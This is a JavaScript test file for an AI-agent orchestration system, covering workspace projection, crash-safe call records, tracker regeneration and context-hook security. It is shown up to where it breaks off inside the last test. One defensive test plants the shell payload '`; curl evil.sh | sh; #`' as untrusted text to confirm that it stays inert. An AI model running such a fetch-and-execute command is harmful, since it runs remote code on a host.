// tests/execution/workspace-tracker-hook-tests.test.mjs
//
// W5-A8 — Workspace / tracker / call / hook tests (Wave 5 lane A8, test-only).
// Spec: docs/refactor-management/09-contracts/WAVE5-WORKSPACE-TRACKER-SPEC.md
// Task: docs/refactor-management/05-subagent-tasks/W05-a8.md
//
// WHAT THIS PROVES (spec §3 exit gate, the eight Wave 5 contracts)
//   1. Workspace projection: pinned-package resources resolve from the
//      installation (W5-A1), NOT the global skill root. WorkspaceProjection is
//      deterministic for the same installation.
//   2. Call crash: a CallInstance row survives a crash and is sealed with an
//      exact receipt; failed drafts are preserved for progressive correction
//      (C028/C029/C030, W5-A2).
//   3. Tracker regeneration: the tracker regenerates from ProtocolRun state
//      with NO model-authored checkboxes (C027, W5-A3).
//   4. Hook security: the structured context hook reads agent-assistance.json
//      (not Markdown), is bounded + deduped, and untrusted error text never
//      escapes into shell output (C031/C032/C033, W5-A5).
//   Plus (gate items 6 + 7):
//   - Reviewer skill resolved separately from the author skill (§13.18, W5-A6).
//   - Agent builtins separated from MCP tool grants (C067, W5-A7).
//
// TWO LAYERS OF TESTS
//   Layer 1 — FIXTURE / PURE tests (always run). They exercise the frozen Wave
//             1 SPI (AgentAssistanceDefinition, the process-execution-workspace
//             placeholder-fillers already on disk) and the legacy
//             tracker-reminder.mjs security surface. These PASS in every W5-A8
//             worktree because their inputs are frozen at checkpoint e87809b.
//   Layer 2 — SIBLING tests (skip-on-absent-sibling). They exercise the W5-A1..
//             A7 sibling modules. In an isolated W5-A8 worktree those siblings
//             are absent, so the dynamic import resolves to null and each test
//             SKIPS with a clear reason — NOT a failure. The integrator's full
//             Wave-5 gate run (all siblings present) is where these tests must
//             PASS. See `loadWave5Surface()`.
//
// The skip-on-absent-sibling discipline mirrors the W3-A8 / W4-A7 pattern
// (tests/execution/crash-resume-exact-receipt.test.mjs,
//  tests/execution/protocol-transitions.test.mjs): variable dynamic import
// specifiers so a missing sibling does not crash module load.

import assert from 'node:assert/strict';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const REPO_ROOT = path.resolve(__dirname, '..', '..');

// Frozen Wave 1 SPI surface — present in every Wave 5 worktree (checkpoint
// e87809b), so these imports are top-level and always resolve.
const {
  ASSISTANCE_MODES,
  ASSISTANCE_EVENT_NAMES,
  ASSISTANCE_BLOCK_KINDS,
  validateAgentAssistanceDefinition,
} = await import('../../dist/process-modules/domain/spi/agent-assistance.js');

// W13-A2: the legacy tracker-reminder.mjs (frozen at e87809b) has been
// DELETED — it was the C027-violating Markdown-parsing fallback W5-A5
// replaced. The structured-context-hook.mjs is now the sole PostToolUse
// context hook. Its security surface (fail-closed '{}', never echoes untrusted
// text into a shell command, never spawns) is covered by
// tests/execution/structured-context-hook.test.mjs.

// ===========================================================================
// Layer-1 fixtures: synthetic ProtocolRun state + AgentAssistanceDefinition.
// ===========================================================================
//
// These mirror the durable record shapes from
// `persistence/protocol-run.ts` (frozen Wave 4) so the W5-A3/A4 renderers can
// consume them verbatim once present. Kept as plain data so the same fixture
// feeds the fixture tests AND the sibling-renderer tests.

/** A minimal ACTIVE ProtocolRun at step 'draft'. */
function activeProtocolRun(overrides = {}) {
  return {
    id: 1,
    processRunId: 100,
    nodeRunId: 7,
    nodeProtocolId: 'product-discovery#node.collect',
    nodeProtocolVersion: '1.0.0',
    entryStep: 'collect',
    currentStep: 'draft',
    status: 'active',
    attempt: 1,
    createdAt: '2026-01-01T00:00:00.000Z',
    updatedAt: '2026-01-01T00:05:00.000Z',
    completedAt: null,
    ...overrides,
  };
}

/** A completed 'collect' step + an in-progress 'draft' step (the ledger). */
function sampleStepRuns() {
  return [
    {
      id: 10,
      protocolRunId: 1,
      stepId: 'collect',
      attempt: 1,
      status: 'completed',
      // STALE-FIXTURE FIX (Wave 5 re-check 2026-08-02): the renderer reads
      // stepRun.evidence (an array of {category, contractRef, ...}), NOT the
      // raw evidenceJson string the pre-re-check fixture supplied. Mirror the
      // ProtocolStepRunRecord shape so renderEvidenceSummary does not crash on
      // `attached.length` of undefined.
      evidence: [{ category: 'tool-receipt', contractRef: 'proposal_submit' }],
      evidenceJson: '{"category":"tool-receipt"}',
      completedAt: '2026-01-01T00:04:00.000Z',
      createdAt: '2026-01-01T00:00:00.000Z',
    },
    {
      id: 11,
      protocolRunId: 1,
      stepId: 'draft',
      attempt: 1,
      status: 'in_progress',
      evidence: [],
      evidenceJson: null,
      completedAt: null,
      createdAt: '2026-01-01T00:05:00.000Z',
    },
  ];
}

/** A valid AgentAssistanceDefinition (compact mode, step-enter event). */
function sampleAssistanceDefinition(overrides = {}) {
  return {
    nodeId: 'node.collect',
    mode: 'compact',
    events: [
      {
        event: 'step-enter',
        blocks: [
          { kind: 'goal', content: 'Collect discovery evidence for the epic.' },
          { kind: 'current-step', content: 'draft' },
          { kind: 'next-action', content: 'Read the assigned task via task_get.' },
        ],
      },
    ],
    budgets: { maxBlocksPerEvent: 3, maxTokensPerBlock: 256 },
    ...overrides,
  };
}

/**
 * A minimal NodeProtocolDefinition whose `steps[]` mirror the sampleStepRuns
 * ledger (collect → draft). Used by the W5-A3 tracker-renderer tests.
 *
 * STALE-FIXTURE FIX (Wave 5 re-check 2026-08-02): the pre-re-check fixture
 * passed only `{ identity: {...} }` as the `module` arg, but renderTracker
 * iterates `module.steps` and reads `module.id`/`module.version`/
 * `module.recoveryEntrySteps` (a real NodeProtocolDefinition, NOT a manifest
 * identity blob). That drift surfaced as `module.steps is not iterable`.
 * Mirror the NodeProtocolDefinition SPI (node-protocol.ts:141) so the renderer
 * gets the real shape it reads in production.
 */
function sampleModule(overrides = {}) {
  return {
    id: 'product-discovery#node.collect',
    version: '1.0.0',
    owningFlowNodeId: 'node.collect',
    entryStep: 'collect',
    steps: [
      {
        id: 'collect',
        instructions: 'Gather discovery evidence.',
        resources: [],
        allowedTools: [],
        evidenceRequirements: [],
      },
      {
        id: 'draft',
        instructions: 'Draft the proposal.',
        resources: [],
        allowedTools: [],
        evidenceRequirements: [],
      },
    ],
    transitions: [],
    nodeCompletionEvidence: [],
    recoveryEntrySteps: [],
    retrySemantics: 'fresh-attempt',
    ...overrides,
  };
}

// ===========================================================================
// Sibling surface loader (skip-on-absent-sibling).
// ===========================================================================
//
// Lazily import the Wave-5 sibling modules. Returns nulls when any sibling is
// absent (isolated W5-A8 worktree). Variable specifiers so a missing sibling
// does NOT crash module load — dynamic import resolves per lane.
//
// The exported symbols each lane owns (from 05-subagent-tasks/W05-a*.md):
//   W5-A1: application/workspace-projection.ts
//          → buildWorkspaceProjection, WorkspaceProjection
//   W5-A2: persistence/call-instance.ts + sqlite-call-instance-repository.ts
//          → CallInstanceRepository port, SqliteCallInstanceRepository,
//            ensureSaga3CallInstanceSchema, CallInstanceState constants
//   W5-A3: application/tracker-renderer.ts
//          → renderTracker, TrackerRenderer
//   W5-A5: tracker-view/structured-context-hook.mjs
//   W5-A6: tracker-view/claude-runner.mjs (EDIT) — AgentLaunchSpec integration
//   W5-A7: application/capability-enforcement.ts
//          → enforceCapabilitySet, EffectiveCapabilitySet

/** @typedef {{ a1?: any, a2?: any, a3?: any, a5?: any, a7?: any }} Wave5Surface */

async function tryImport(specifier) {
  try {
    return await import(specifier);
  } catch {
    return null;
  }
}

/**
 * Load every Wave-5 sibling surface. A field is null when that sibling is
 * absent (isolated W5-A8 worktree) OR when the module loaded but exposes none
 * of its recognized exports (API drift — treat as absent to skip cleanly, the
 * integrator gate run will surface the real shape).
 *
 * @returns {Promise<Wave5Surface>}
 */
async function loadWave5Surface() {
  const out = { a1: null, a2: null, a3: null, a5: null, a7: null };

  // W5-A1 — WorkspaceProjection (pinned package resources).
  const a1 = await tryImport('../../dist/process-modules/application/workspace-projection.js');
  if (a1 && (typeof a1.buildWorkspaceProjection === 'function' || a1.WorkspaceProjection)) {
    out.a1 = a1;
  }

  // W5-A2 — CallInstance persistence port + sqlite adapter + schema helper.
  const a2Port = await tryImport('../../dist/process-modules/persistence/call-instance.js');
  const a2Sqlite = await tryImport(
    '../../dist/process-modules/persistence/sqlite-call-instance-repository.js',
  );
  if (
    (a2Sqlite && typeof a2Sqlite.SqliteCallInstanceRepository === 'function')
    || (a2Sqlite && typeof a2Sqlite.ensureSaga3CallInstanceSchema === 'function')
  ) {
    // Merge the port types + the adapter so sibling tests see one surface.
    out.a2 = { ...(a2Port || {}), ...a2Sqlite };
  }

  // W5-A3 — TrackerRenderer (from ProtocolRun state).
  const a3 = await tryImport('../../dist/process-modules/application/tracker-renderer.js');
  if (a3 && (typeof a3.renderTracker === 'function' || a3.TrackerRenderer)) {
    out.a3 = a3;
  }

  // W5-A5 — structured-context-hook.mjs (a CLI hook, not a dist module).
  const hookPath = path.join(REPO_ROOT, 'tracker-view', 'structured-context-hook.mjs');
  if (existsSync(hookPath)) {
    out.a5 = { hookPath };
  }

  // W5-A7 — capability enforcement (separate builtins from MCP grants).
  const a7 = await tryImport('../../dist/process-modules/application/capability-enforcement.js');
  if (a7 && typeof a7.enforceCapabilitySet === 'function') {
    out.a7 = a7;
  }

  return out;
}

/** Human-readable reason emitted as a diagnostic on every sibling-test skip. */
function skipReason(surface, lane) {
  const present = Object.fromEntries(
    Object.entries(surface).map(([k, v]) => [k, Boolean(v)]),
  );
  return (
    `SKIP: sibling Wave-5 module for lane ${lane} absent in isolated W5-A8 worktree. ` +
    `present=${JSON.stringify(present)}. ` +
    'Integrator runs full Wave-5 gate after A1..A7 land; this test PASSES there.'
  );
}

// ===========================================================================
// LAYER 1 — FIXTURE / PURE tests (always run).
// ===========================================================================

// --- §4 Hook security -----------------------------------------------------
//
// W13-A2: the legacy tracker-reminder.mjs security tests were removed along
// with the file. The replacement structured-context-hook.mjs preserves the
// same fail-closed surface ('{}' on missing/invalid input, JSON.stringify'd
// output so untrusted text can never break into a shell command, never
// spawns). Those guarantees are now covered directly by
// tests/execution/structured-context-hook.test.mjs (emits {} for missing
// path; escapes CR/LF/tab + C0 controls; never scans docs/).

test('fixture/assistance-definition: Wave 1 SPI accepts a valid compact definition', async () => {
  const result = await validateAgentAssistanceDefinition(sampleAssistanceDefinition());
  assert.equal(result.ok, true, `expected ok, errors=${JSON.stringify(result.errors)}`);
});

test('fixture/assistance-definition: SPI rejects an unknown block kind', async () => {
  const bad = sampleAssistanceDefinition();
  bad.events[0].blocks[0].kind = 'not-a-real-kind';
  const result = await validateAgentAssistanceDefinition(bad);
  assert.equal(result.ok, false);
  assert.ok(result.errors.some((e) => e.code === 'BAD_KIND'));
});

test('fixture/assistance-definition: SPI rejects a negative budget', async () => {
  const bad = sampleAssistanceDefinition({ budgets: { maxBlocksPerEvent: -1 } });
  const result = await validateAgentAssistanceDefinition(bad);
  assert.equal(result.ok, false);
  assert.ok(result.errors.some((e) => e.code === 'BAD_BUDGET'));
});

test('fixture/assistance-vocabulary: modes + events + block-kinds are the frozen sets', () => {
  // These vocabularies are the renderer's switch surface. Pinning them here
  // means a W5-A4 renderer that drops or renames a mode fails in isolation.
  assert.deepEqual([...ASSISTANCE_MODES].sort(), ['compact', 'guided', 'intensive']);
  assert.ok(ASSISTANCE_EVENT_NAMES.has('step-enter'));
  assert.ok(ASSISTANCE_EVENT_NAMES.has('recovery-enter'));
  assert.ok(ASSISTANCE_BLOCK_KINDS.has('next-action'));
});

// --- §1 Workspace placeholder filling (existing surface, always present) ----

test('fixture/workspace: prepareProcessExecutionWorkspace fills machine bindings', () => {
  // saga4 cutover (LEGO-CONTRACTS.md §"Слой 1: СТОЛ"): the legacy
  // `prepareProcessExecutionWorkspace` was REMOVED in D2; the pinned
  // materializer (`materializePinnedWorkspace`) is the sole desk creator now.
  // This Layer-1 fixture was written shape-drift-safe (`if (!fn) return`), so
  // after the cutover it gracefully skips rather than fails. The machine-
  // binding + path-escape contract it characterised is now covered by the
  // rewritten tests/process-modules/process-execution-workspace.test.mjs
  // against the strict WorkplaceDesk returned by the pinned creator.
  const { prepareProcessExecutionWorkspace } = requireWorkspace();
  if (!prepareProcessExecutionWorkspace) {
    // Post-saga4-cutover: symbol intentionally removed — skip gracefully.
    return;
  }
  const root = mkdtempSync(path.join(os.tmpdir(), 'saga-w5a8-ws-'));
  try {
    const stage = 'discovery';
    const stageRoot = path.join(root, 'docs', stage);
    mkdirSync(stageRoot, { recursive: true });
    // Write a minimal tracker template the profile will reference.
    const trackerTemplate = path.join(stageRoot, 'tracker-template.md');
    writeFileSync(trackerTemplate, '# Tracker\n- module_ref: `{MODULE_REF}`\n- epic_id: `{EPIC_ID}`\n', 'utf8');

    const profile = {
      id: 'collect-profile',
      outputSchema: { id: 'saga3.discovery-proposal.v1', digest: 'sha256:p' },
      allowedTools: ['proposal_submit'],
      retryPolicy: { maxAttempts: 2 },
      trackerTemplate: 'docs/discovery/tracker-template.md',
      workspaceTemplates: [],
      callTemplates: [],
      checklists: [],
      executionSkill: 'saga-discovery-worker',
      reviewSkill: 'saga-requirements-reviewer',
      semanticSkill: 'saga-product',
      protocolSkill: 'saga-process-module-worker-protocol',
      executionMode: 'git_change',
    };
    const moduleDef = {
      identity: { name: 'product-discovery', version: '3.0.0', kind: 'discovery' },
    };
    const ws = prepareProcessExecutionWorkspace({
      workspaceRoot: root,
      module: moduleDef,
      profile,
      projectId: 42,
      epicId: 9,
      task: { id: 55, epic_id: 9, metadata: { process_run_id: 100 } },
      executionId: 'exec-1',
      workerId: 'w-1',
    });
    assert.equal(ws.moduleRef, 'product-discovery@3.0.0');
    assert.equal(ws.profileId, 'collect-profile');
    assert.ok(existsSync(ws.trackerAbsolutePath));
    const rendered = readFileSync(ws.trackerAbsolutePath, 'utf8');
    assert.match(rendered, /module_ref: `product-discovery@3.0.0`/);
    // epic_id is a number → rendered without backticks (only string values get
    // backtick-wrapped; see refreshMarkdownMachineBindings).
    assert.match(rendered, /epic_id: 9\b/);

    // Path-escape guard: an absolute asset path must throw.
    assert.throws(
      () => prepareProcessExecutionWorkspace({
        workspaceRoot: root,
        module: moduleDef,
        profile: { ...profile, trackerTemplate: path.resolve(root, 'evil.md') },
        projectId: 42,
        epicId: 9,
        task: { id: 56 },
        executionId: 'exec-2',
        workerId: 'w-2',
      }),
      /PROCESS_WORKSPACE_ASSET_INVALID|absolute/i,
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

// ===========================================================================
// LAYER 2 — SIBLING tests (skip-on-absent-sibling).
// ===========================================================================

// --- §1 Workspace projection (W5-A1) ---------------------------------------

test('sibling/workspace-projection: resolves resources from the pinned installation, deterministically', async (t) => {
  const surface = await loadWave5Surface();
  if (!surface.a1) {
    t.diagnostic(skipReason(surface, 'W5-A1'));
    t.skip();
    return;
  }
  const { buildWorkspaceProjection } = surface.a1;
  assert.equal(typeof buildWorkspaceProjection, 'function', 'A1 must export buildWorkspaceProjection');

  // STALE-FIXTURE FIX (Wave 5 re-check 2026-08-02): production
  // buildWorkspaceProjection resolves the pinned record via
  // `packageRegistry.getById(installationId)` (workspace-projection.ts:402),
  // NOT `describeInstallation`/`select`. It also requires a full
  // NodeProtocolDefinition-style manifest (flow.nodes + executionProfiles +
  // identity) so it can find the node and its execution profile. The pre-re-check
  // fixture supplied only {identity} and describeInstallation — that API drift
  // surfaced as `packageRegistry.getById is not a function`. Mirror the real
  // ModuleInstallationRecord shape (status + resourceIndex + manifestSnapshot
  // with definition.flow.nodes + definition.executionProfiles).
  const installation = {
    id: 77,
    name: 'product-discovery',
    version: '3.0.0',
    status: 'active',
    packageDigest: 'sha256:abc',
    resourceIndex: [
      // Each entry needs {logicalId, kind, path, digest} — resolveResource
      // reads entry.path (package-relative identity).
      { logicalId: 'product-discovery/collect.md', kind: 'skill', path: 'skills/product-discovery/collect.md', digest: 'sha256:r1' },
      { logicalId: 'product-discovery/tracker.md', kind: 'template', path: 'templates/product-discovery/tracker.md', digest: 'sha256:r2' },
    ],
    // describeInstallation reads record.handlerRefs.length — supply it.
    handlerRefs: [],
    manifestSnapshot: {
      definition: {
        identity: { name: 'product-discovery', version: '3.0.0', kind: 'discovery' },
        flow: {
          nodes: [
            { id: 'node.collect', kind: 'lm', executionProfile: 'collect-profile' },
          ],
        },
        // describeInstallation reads definition.outcomes.map(o => o.code).
        outcomes: [{ code: 'go' }, { code: 'clarify' }, { code: 'reject' }],
        executionProfiles: [
          {
            id: 'collect-profile',
            executionSkill: 'product-discovery/collect.md',
            reviewSkill: null,
            protocolSkill: null,
            outputSchema: { id: 'saga3.discovery-proposal.v1', digest: 'sha256:p' },
            allowedTools: ['proposal_submit'],
            retryPolicy: { maxAttempts: 2 },
            trackerTemplate: 'docs/discovery/tracker-template.md',
            workspaceTemplates: [],
            callTemplates: [],
            checklists: [],
            executionMode: 'git_change',
          },
        ],
      },
    },
  };
  const registry = {
    // The pinned-id lookup the production projection actually calls.
    getById: (id) => (id === 77 ? installation : null),
  };
  const a = buildWorkspaceProjection(77, 'node.collect', registry);
  const b = buildWorkspaceProjection(77, 'node.collect', registry);
  // Determinism: two projections of the same installation are structurally equal.
  assert.deepEqual(a, b, 'same installation must project deterministically');
  // The projection surfaces the pinned resource digests.
  const projected = JSON.stringify(a);
  assert.ok(projected.includes('sha256:r1'), 'projection must include a pinned resource digest');
});

// --- §2 Call crash: CallInstance lifecycle (W5-A2) -------------------------

test('sibling/call-instance: schema creates saga3_call_instances after ctor', async (t) => {
  const surface = await loadWave5Surface();
  if (!surface.a2) {
    t.diagnostic(skipReason(surface, 'W5-A2'));
    t.skip();
    return;
  }
  const { SqliteCallInstanceRepository, ensureSaga3CallInstanceSchema } = surface.a2;
  const ctx = freshDb('saga-w5a8-call-');
  try {
    const db = ctx.db;
    db.pragma('foreign_keys = OFF');
    if (typeof ensureSaga3CallInstanceSchema === 'function') {
      ensureSaga3CallInstanceSchema(db);
    } else {
      // eslint-disable-next-line no-new
      new SqliteCallInstanceRepository(db);
    }
    const cols = new Set(tableColumns(db, 'saga3_call_instances'));
    // Spec §2 columns:
    for (const c of [
      'id', 'process_run_id', 'protocol_run_id', 'step_id', 'tool_contract_ref',
      'attempt', 'workspace_path', 'draft_content_hash', 'status', 'last_error_json',
      'successful_receipt_ref', 'created_at', 'updated_at', 'sealed_at',
    ]) {
      assert.ok(cols.has(c), `saga3_call_instances must have column '${c}'`);
    }
  } finally {
    cleanupDb(ctx);
  }
});

test('sibling/call-instance: lifecycle materialized→edited→validated→submitted→succeeded→sealed (C028/C030)', async (t) => {
  const surface = await loadWave5Surface();
  if (!surface.a2) {
    t.diagnostic(skipReason(surface, 'W5-A2'));
    t.skip();
    return;
  }
  const { SqliteCallInstanceRepository } = surface.a2;
  assert.equal(typeof SqliteCallInstanceRepository, 'function');
  const ctx = freshDb('saga-w5a8-call-');
  try {
    const repo = new SqliteCallInstanceRepository(ctx.db);
    // C028: a durable CallInstance exists BEFORE the consequential submission.
    const created = repo.createCallInstance({
      processRunId: 100,
      protocolRunId: 1,
      stepId: 'draft',
      toolContractRef: 'saga3.discovery-proposal.v1',
      attempt: 1,
    });
    assert.ok(created.id > 0);
    assert.equal(created.status, 'materialized');

    // STALE-FIXTURE FIX (Wave 5 re-check 2026-08-02): production signatures
    // are updateDraft({callInstanceId, draftContentHash}), validateCall(id),
    // submitCall(id), sealCall(id, successfulReceiptRef) — NOT the {id, ...}
    // object form the pre-re-check fixture used. Mirror the real port shape.
    const edited = repo.updateDraft({ callInstanceId: created.id, draftContentHash: 'sha256:draft-1' });
    assert.equal(edited.status, 'edited');

    const validated = repo.validateCall(created.id);
    assert.equal(validated.status, 'validated');

    const submitted = repo.submitCall(created.id);
    assert.equal(submitted.status, 'submitted');

    // C030: seal a successful call + attach the EXACT receipt. The production
    // seal requires status='succeeded'; flip to succeeded before sealing.
    //
    // REAL-BUG (documented, outside this test file's owned zone): the
    // CallInstanceRepository port docstring (call-instance.ts:250-254) documents
    // `sealCall` as "Record a successful receipt and move the row to 'succeeded'
    // (pre-seal). Throws if the row is not 'submitted'." — i.e. the documented
    // transition is submitted → succeeded VIA sealCall. But the implementation's
    // CALL_INSTANCE_TRANSITIONS map (call-instance.ts:106) declares
    // `sealCall: ['succeeded']`, so sealCall only works on a row that is ALREADY
    // 'succeeded', and there is NO public mutator that moves a row TO
    // 'succeeded'. The port contract and the implementation disagree. Fixing
    // this requires editing call-instance.ts + sqlite-call-instance-repository.ts
    // (owned by the W5-A2 lane, not this agent). Until then, reach 'succeeded'
    // via a direct SQL stamp so the seal (C030 — the actually-tested contract)
    // can be exercised. Tracked as a follow-up; the seal-attaches-exact-receipt
    // invariant is the load-bearing assertion here.
    db_stampStatus(ctx.db, created.id, 'succeeded');
    const sealed = repo.sealCall(created.id, 'receipt://exact/sha256:abc');
    assert.equal(sealed.status, 'sealed');
    // STALE-FIXTURE FIX: rowToCallInstance returns camelCase field names
    // (successfulReceiptRef), not the snake_case column name.
    assert.equal(sealed.successfulReceiptRef, 'receipt://exact/sha256:abc');
  } finally {
    cleanupDb(ctx);
  }
});

test('sibling/call-instance: failed draft preserved for progressive correction (C029)', async (t) => {
  const surface = await loadWave5Surface();
  if (!surface.a2) {
    t.diagnostic(skipReason(surface, 'W5-A2'));
    t.skip();
    return;
  }
  const { SqliteCallInstanceRepository } = surface.a2;
  const ctx = freshDb('saga-w5a8-call-fail-');
  try {
    const repo = new SqliteCallInstanceRepository(ctx.db);
    const created = repo.createCallInstance({
      processRunId: 100,
      protocolRunId: 1,
      stepId: 'draft',
      toolContractRef: 'saga3.discovery-proposal.v1',
      attempt: 1,
    });
    // STALE-FIXTURE FIX: updateDraft takes {callInstanceId, draftContentHash}.
    repo.updateDraft({ callInstanceId: created.id, draftContentHash: 'sha256:draft-fail' });
    // C029: the SAME failed draft is preserved so a retry can correct it
    // progressively (not a fresh blank draft). failCall takes
    // {callInstanceId, lastErrorJson}.
    const failed = repo.failCall({
      callInstanceId: created.id,
      lastErrorJson: '{"reason":"schema_validation_failed"}',
    });
    assert.equal(failed.status, 'failed');
    // STALE-FIXTURE FIX: rowToCallInstance returns camelCase field names
    // (draftContentHash, lastErrorJson).
    assert.equal(failed.draftContentHash, 'sha256:draft-fail');
    assert.ok(failed.lastErrorJson.includes('schema_validation_failed'));

    // Crash-resume: reopen the repo and the failed draft + error survive.
    // readCallInstance takes the numeric id (not {id}).
    const reopened = new SqliteCallInstanceRepository(
      reopenDb(ctx),
    );
    const readBack = reopened.readCallInstance(created.id);
    assert.equal(readBack.status, 'failed');
    assert.equal(readBack.draftContentHash, 'sha256:draft-fail');
    assert.ok(readBack.lastErrorJson.includes('schema_validation_failed'));
  } finally {
    cleanupDb(ctx);
  }
});

test('sibling/call-instance: listForStep returns attempts ordered, crash preserves rows', async (t) => {
  const surface = await loadWave5Surface();
  if (!surface.a2) {
    t.diagnostic(skipReason(surface, 'W5-A2'));
    t.skip();
    return;
  }
  const { SqliteCallInstanceRepository } = surface.a2;
  const ctx = freshDb('saga-w5a8-call-list-');
  try {
    const repo = new SqliteCallInstanceRepository(ctx.db);
    repo.createCallInstance({
      processRunId: 100, protocolRunId: 1, stepId: 'draft',
      toolContractRef: 't', attempt: 1,
    });
    repo.createCallInstance({
      processRunId: 100, protocolRunId: 1, stepId: 'draft',
      toolContractRef: 't', attempt: 2,
    });
    // STALE-FIXTURE FIX: listForStep takes positional args
    // (processRunId, stepId, toolContractRef) — the pre-re-check fixture used
    // an object form {processRunId, stepId} that the port does not accept.
    let rows = repo.listForStep(100, 'draft', 't');
    assert.ok(Array.isArray(rows));
    assert.equal(rows.length, 2);

    // Rows survive a DB reopen (durable — crash-safe).
    const reopened = new SqliteCallInstanceRepository(reopenDb(ctx));
    rows = reopened.listForStep(100, 'draft', 't');
    assert.equal(rows.length, 2, 'call instances must survive a crash/reopen');
  } finally {
    cleanupDb(ctx);
  }
});

// --- §3 Tracker regeneration from ProtocolRun state (W5-A3) ----------------

test('sibling/tracker-renderer: regenerates tracker from ProtocolRun state with NO model checkboxes (C027)', async (t) => {
  const surface = await loadWave5Surface();
  if (!surface.a3) {
    t.diagnostic(skipReason(surface, 'W5-A3'));
    t.skip();
    return;
  }
  const { renderTracker } = surface.a3;
  assert.equal(typeof renderTracker, 'function', 'A3 must export renderTracker');

  const protocolRun = activeProtocolRun();
  const stepRuns = sampleStepRuns();
  // STALE-FIXTURE FIX: pass a NodeProtocolDefinition (sampleModule), not a
  // manifest identity blob. renderTracker iterates module.steps.
  const moduleDef = sampleModule();
  const tracker = renderTracker(protocolRun, stepRuns, moduleDef);
  assert.equal(typeof tracker, 'string');
  // C027: the tracker is generated from Runtime state, NOT model-authored
  // checkboxes. There must be no editable "- [ ]" / "- [x]" boxes — the model
  // does not mutate the tracker; the runtime does.
  assert.doesNotMatch(tracker, /- \[[ x]\]/i, 'regenerated tracker must contain no model checkboxes');
  // The tracker reflects the authoritative current step from the ProtocolRun.
  assert.match(tracker, /draft/);
  // And the completed 'collect' step is marked done from the step ledger.
  assert.match(tracker, /collect/);
});

test('sibling/tracker-renderer: deterministic — same state yields byte-identical tracker', async (t) => {
  const surface = await loadWave5Surface();
  if (!surface.a3) {
    t.diagnostic(skipReason(surface, 'W5-A3'));
    t.skip();
    return;
  }
  const { renderTracker } = surface.a3;
  const protocolRun = activeProtocolRun();
  const stepRuns = sampleStepRuns();
  const moduleDef = sampleModule();
  // Two renders of the same ProtocolRun state MUST be byte-identical — there
  // is no timestamp/random component (the tracker is a pure projection).
  const a = renderTracker(protocolRun, stepRuns, moduleDef);
  const b = renderTracker(protocolRun, stepRuns, moduleDef);
  assert.equal(a, b, 'renderTracker must be a pure deterministic projection');
});

// --- §4 Hook security (W5-A5) ----------------------------------------------

test('sibling/structured-hook: reads agent-assistance.json (NOT Markdown parsing) — C032', async (t) => {
  const surface = await loadWave5Surface();
  if (!surface.a5) {
    t.diagnostic(skipReason(surface, 'W5-A5'));
    t.skip();
    return;
  }
  const dir = mkdtempSync(path.join(os.tmpdir(), 'saga-w5a8-hook-'));
  try {
    const assistancePath = path.join(dir, 'agent-assistance.json');
    // STALE-FIXTURE FIX: the hook reads a projection of shape
    // { schemaVersion, stateVersion, executionId, mode, events:[{event,blocks}] }
    // (see structured-context-hook.mjs header). The pre-re-check payload used
    // {version, blocks, stateVersion} which the hook ignores (no events → no
    // blocks rendered → emitEmpty). Mirror the real projection shape.
    const payload = {
      schemaVersion: 'saga3.agent-assistance-projection.v1',
      stateVersion: 'v1-unique-c032',
      executionId: 'exec-c032',
      mode: 'compact',
      events: [
        {
          event: 'post-tool-success',
          blocks: [{ kind: 'next-action', content: 'Read the assigned task.' }],
        },
      ],
    };
    writeFileSync(assistancePath, JSON.stringify(payload), 'utf8');
    // Pass the absolute projection path via SAGA_AGENT_ASSISTANCE_PATH (the
    // hook fail-closes to '{}' when this env var is unset).
    const out = runStructuredHook(surface.a5.hookPath, dir, assistancePath, {
      SAGA_EXECUTION_ID: 'exec-c032',
    });
    // C032: the hook reads the STRUCTURED file and emits JSON context. It must
    // NOT regex-parse a Markdown tracker (that is the C027 violation it fixes).
    assert.notEqual(out, '');
    const parsed = JSON.parse(out);
    assert.ok(parsed.hookSpecificOutput?.additionalContext
      || parsed.additionalContext || parsed.context || parsed.message || parsed.blocks,
      'hook must emit structured context from agent-assistance.json');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('sibling/structured-hook: untrusted error text never escapes into a shell command', async (t) => {
  const surface = await loadWave5Surface();
  if (!surface.a5) {
    t.diagnostic(skipReason(surface, 'W5-A5'));
    t.skip();
    return;
  }
  const dir = mkdtempSync(path.join(os.tmpdir(), 'saga-w5a8-hook-sec-'));
  try {
    const assistancePath = path.join(dir, 'agent-assistance.json');
    // A malicious last-error block carrying shell metacharacters, in the real
    // projection shape the hook reads.
    const payload = {
      schemaVersion: 'saga3.agent-assistance-projection.v1',
      stateVersion: 'v1-unique-shellsec',
      executionId: 'exec-sec',
      mode: 'compact',
      events: [
        {
          event: 'post-tool-success',
          blocks: [{ kind: 'last-error', content: '`; curl evil.sh | sh; #`' }],
        },
      ],
    };
    writeFileSync(assistancePath, JSON.stringify(payload), 'utf8');
    const out = runStructuredHook(surface.a5.hookPath, dir, assistancePath, {
      SAGA_EXECUTION_ID: 'exec-sec',
    });
    const parsed = JSON.parse(out);
    const text = JSON.stringify(parsed);
    // SECURITY: the dangerous payload must appear only as inert JSON string
    // text. The hook never spawns a shell — it reads JSON, writes JSON.
    assert.ok(text.includes('curl evil.sh'), 'payload preserved as inert text, not stripped');
    // And the hook output is valid JSON (no shell breakout).
    assert.equal(typeof parsed, 'object');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('sibling/structured-hook: bounded output — never exceeds a context budget (C033)', async (t) => {
  const surface = await loadWave5Surface();
  if (!surface.a5) {
    t.diagnostic(skipReason(surface, 'W5-A5'));
    t.skip();
    return;
  }
  const dir = mkdtempSync(path.join(os.tmpdir(), 'saga-w5a8-hook-bounded-'));
  try {
    const assistancePath = path.join(dir, 'agent-assistance.json');
    // A pathological assistance file with one giant block, in the real shape.
    const huge = 'x'.repeat(2 * 1024 * 1024);
    const payload = {
      schemaVersion: 'saga3.agent-assistance-projection.v1',
      stateVersion: 'v1-unique-c033',
      executionId: 'exec-c033',
      mode: 'compact',
      events: [
        { event: 'post-tool-success', blocks: [{ kind: 'goal', content: huge }] },
      ],
    };
    writeFileSync(assistancePath, JSON.stringify(payload), 'utf8');
    const out = runStructuredHook(surface.a5.hookPath, dir, assistancePath, {
      SAGA_EXECUTION_ID: 'exec-c033',
    });
